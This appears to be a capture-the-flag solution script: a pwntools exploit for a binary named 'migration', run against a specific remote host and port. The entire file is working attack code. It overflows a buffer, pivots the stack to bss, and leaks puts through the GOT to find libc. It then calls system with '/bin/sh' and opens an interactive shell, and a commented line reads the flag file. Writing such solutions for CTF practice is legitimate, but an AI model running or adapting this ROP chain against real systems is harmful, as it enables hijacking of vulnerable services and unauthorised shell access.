#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './migration'
LIBC = ''
HOST = '140.110.112.77'
PORT = 2127

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )

pop_ebx_ret = 0x0804836d
bss = 0x0804ad00
leave_ret = 0x08048418

ROP = flat(
    bss,
    e.sym['read'],
    leave_ret,
    0,
    bss,
    0x100,
)
ROP2 = flat(
    bss+0x100, # bss2
    e.sym['puts'],
    pop_ebx_ret,
    e.got['puts'],
    e.sym['read'],
    leave_ret,
    0,
    bss+0x100,
    0x100,
)

r.send(b'A'*0x28 + ROP)
sleep(0.1)
r.send(ROP2)
puts_offset = 0x71290 # local
puts_offset = 0x5fca0 # remote
system_offset = 0x45420 # local
system_offset = 0x3ada0 # remote

r.recvuntil('best :\n')
libc_base = u32(r.recv(4)) - puts_offset
system_addr = libc_base + system_offset

log.info(f"libc_base: {hex(libc_base)}")
log.info(f"system_addr: {hex(system_addr)}")
ROP3 = flat(
    bss,
    system_addr, # bss2 + 0
    0, # bss2 + 4
    bss+0x100+0x10, # bss + 8,
    b"/bin/sh\x00", # bss + c
)
input()
sleep(0.1)
r.send(ROP3)
#r.sendline('cat /home/`whoami`/flag')
r.interactive()
